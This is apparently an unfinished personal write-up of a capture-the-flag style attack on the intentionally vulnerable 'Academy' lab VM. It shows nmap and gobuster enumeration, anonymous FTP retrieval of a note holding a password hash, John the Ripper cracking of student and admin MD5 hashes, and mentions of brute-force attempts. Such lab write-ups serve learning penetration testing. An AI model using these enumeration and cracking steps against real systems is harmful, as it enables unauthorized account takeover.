## Box: [Academy] — Started: 2025-10-16 20:10

**IP/Host:** VM Mac ADDR `00:0C:29:56:42:1F`  |  **Status:** `In-Progress`
**Session IP**: 192.168.109.131

### in prog notes

grimmie ???
jdelta ???

`academy` -> 10201321:thxforlettingmein
`academy/admin` -> admin:admin

`phpMyAdmin` ???
SSH or root ???



### TL;DR

**NOTE**: This is an intenionally vulnerable machine, so I'm treating this as though it were a CTF. As such, data from the machine will be included in this writeup, and I will also do things I normally wouldn't do in an engagement (such as change a student's password!)

Initial: `how in`. PrivEsc: `how root`.

*Cumulative Impact Overview*:
- data exfil on unsecured site
- User access and disruption

### Exploit Lifecycle

1. *Validation & Recon*: Local VM vulnbox
2. *Enumeration & Scanning*:
    - `nmap -sV`
```bash
nmap -sV 192.168.109.131
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-16 20:50 EDT
Nmap scan report for 192.168.109.131
Host is up (0.000035s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
MAC Address: 00:0C:29:56:42:1F (VMware)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.42 seconds
```

Basically two lines of investigation so far-- notable that ssh is a possible third, but inefficient, so let's try the two easier once first.

##### Website first

- Open 80 -> website hosted by Apache. Navigating in browser to web address finds a default Apache page. 
    - `gobuster` enum results:
```bash
gobuster dir -u http://192.168.109.131 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.109.131
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/academy              (Status: 301) [Size: 320] [--> http://192.168.109.131/academy/]
/phpmyadmin           (Status: 301) [Size: 323] [--> http://192.168.109.131/phpmyadmin/]
/server-status        (Status: 403) [Size: 280]
Progress: 220558 / 220558 (100.00%)
===============================================================
Finished
===============================================================
```

3. *Findings & Exploits*:

`/academy`:
![[Pasted image 20251016211617.png|500]]
*this is a mySQL db as well*:
![[Pasted image 20251016212219.png|500]]


`phpmyadmin`:
![[Pasted image 20251016211805.png|500]]


##### FTP next

- FTP anon try:
```bash
ftp -a ftp://192.168.109.131
Connected to 192.168.109.131.
220 (vsFTPd 3.0.3)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.
ftp> ls
229 Entering Extended Passive Mode (|||46560|)
150 Here comes the directory listing.
-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
226 Directory send OK.
ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||25783|)
150 Opening BINARY mode data connection for note.txt (776 bytes).
100% |*********************************************************************************************************************|   776      733.60 KiB/s    00:00 ETA
226 Transfer complete.
776 bytes received in 00:00 (520.83 KiB/s)
ftp> 

#### TERMINAL 2 ####
$ cat note.txt               
Hello Heath !
Grimmie has setup the test website for the new academy.
I told him not to use the same password everywhere, he will change it ASAP.


I couldn't create a user via the admin panel, so instead I inserted directly into the database with the following command:

INSERT INTO `students` (`StudentRegno`, `studentPhoto`, `password`, `studentName`, `pincode`, `session`, `department`, `semester`, `cgpa`, `creationdate`, `updationDate`) VALUES
('10201321', '', 'cd73502828457d15655bbd7a63fb0bc8', 'Rum Ham', '777777', '', '', '', '7.60', '2021-05-29 14:36:56', '');

The StudentRegno number is what you use for login.


Le me know what you think of this open-source project, it's from 2020 so it should be secure... right ?
We can always adapt it to our needs.

-jdelta

```

back to `/academy` webpage
- Student named "Rum Ham" might have a login at RegNo:pw of 10201321:cd73502828457d15655bbd7a63fb0bc8
    - password is likely a hash, trying it in the webpage confirms it as it does not login using the literal string. Will try `john` next. Looks like an MD5 so...
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 crackthis.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
student          (?)     
1g 0:00:00:00 DONE (2025-10-16 21:56) 100.0g/s 211200p/s 211200c/s 211200C/s amore..morado
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 

```
- Login success! creating a new password for a student... thxforlettingmein

On `/phpmyadmin` none of the above lets us in, so I'm attempting a `burpsuite` password attack with `grimmie`, since he seems to use insecure passwords according to `note.txt`.

- After attempting this I realized that the web app was redirecting to `phpmyadmin/index.php`, and it was obtaining a session cookie from `phpmyadmin` that was being used for auth. I could have done a two stage attack (where I first have `burpsuite` get the session cookie from `phpmyadmin` then attempt to bruteforce a login to `phpmyadmin/index.php` using the session cookie). But I don't have burpsuite pro, which would have been necessary to use macros from what I could see, so this would have been an inefficient lift.
 
I decided to pivot to a hydra attack to bruteforce `grimmie`'s password on SSH, since I had a username, but this also did not work.

Then I looked at what I knew, and decided I knew how to get into `academy` for sure, so maybe I could re-enumerate passing in the password and REGNO as the username in `gobuster`

```bash
gobuster dir -U 10201321 -P thxforlettingmein -u http://192.168.109.131/academy -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.109.131/academy
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Auth User:               10201321
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 326] [--> http://192.168.109.131/academy/admin/]
/assets               (Status: 301) [Size: 327] [--> http://192.168.109.131/academy/assets/]
/includes             (Status: 301) [Size: 329] [--> http://192.168.109.131/academy/includes/]
/db                   (Status: 301) [Size: 323] [--> http://192.168.109.131/academy/db/]
Progress: 220558 / 220558 (100.00%)
===============================================================
Finished
===============================================================

```

- `academy/admin` didn't work, because the student I was logging in as wasn't an admin. However `academy/db` yielded their SQL db which has a listing for the admin's password hash

4. *PrivEsc*:
```bash
INSERT INTO `admin` (`id`, `username`, `password`, `creationDate`, `updationDate`) VALUES
(1, 'admin', '21232f297a57a5a743894a0e4a801fc3', '2020-01-24 16:21:18', '03-06-2020 07:09:07 PM')
```

- running john...
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 crackthis.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
admin            (?)     
1g 0:00:00:00 DONE (2025-10-17 00:05) 100.0g/s 1996Kp/s 1996Kc/s 1996KC/s clyde1..jonel
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 

```

- admin:admin into `academy/admin` from the second round of enum got us to the online course admin panel
![[Pasted image 20251017000737.png|500]]

5. *Post-Exploitation*:

*Proof — path to flags/screenshot of boxpwn*:

### Findings

- _Found_: 80 - 192.168.109.131 - 2025-10-16 21:12:27 - Default Apache page served (`It works!`) — default vhost present; server reachable; potential fingerprinting/info exposure.
- *Found*: 21 - 192.168.109.131 - 2025-10-16 21:31:55 - FTP, while a non-vulnerable version, does allow for anonymous login. -> `note.txt` is downloadable anonymously, and is sensitive data exposure
    - *Found*: 21 -> 80 - 192.168.109.131/academy - 2025-10-16 22:00:19 - Was allowed access to student's account and changed their password
- *Found*: 80 - 192.168.109.131/academy - 2025-10-17 00:02:29 - unrestricted access to SQL db named `onlinecourse.sql`, which contains admin's password hash
- *UNCONFIRMED - Found*: 80 - 192.168.109.131/academy/admin - 2025-10-17 00:33:34 - Bad admin credentials (presumably default admin credentials)

### Commands Learned or Commands Used

```bash
# annotate each command with purpose & timestamp
##  - examples:
nmap -sC -sV x.x.x.x         # quick scan — YYYY-MM-DD HH:MM
curl 'http://x.x.x.x/login'  # check auth endpoint
```

## Scratchpad